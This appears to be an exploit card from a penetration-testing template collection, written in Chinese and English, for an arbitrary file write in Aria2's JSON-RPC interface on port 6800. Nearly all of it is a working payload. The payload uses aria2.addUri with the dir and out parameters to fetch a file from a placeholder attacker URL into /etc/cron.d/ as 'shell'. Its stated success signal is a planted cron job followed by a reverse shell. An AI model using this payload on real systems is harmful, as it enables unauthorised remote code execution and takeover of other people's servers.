# Aria2 Arbitrary File Write

## 指纹特征
- 服务: Aria2
- 端口: 6800 (JSON-RPC)

## PoC 指令

通过 JSON-RPC 接口添加下载任务，利用 `dir` 和 `out` 参数写入任意路径文件 (如 crontab):

```json
{
  "jsonrpc": "2.0",
  "method": "aria2.addUri",
  "id": "1",
  "params": [
    ["{{ATTACKER_FILE_URL}}"],
    {"dir": "/etc/cron.d/", "out": "shell"}
  ]
}
```

## Success Signal
- 定时任务在 `/etc/cron.d/` 目录下创建。
- 随后触发反弹 Shell。
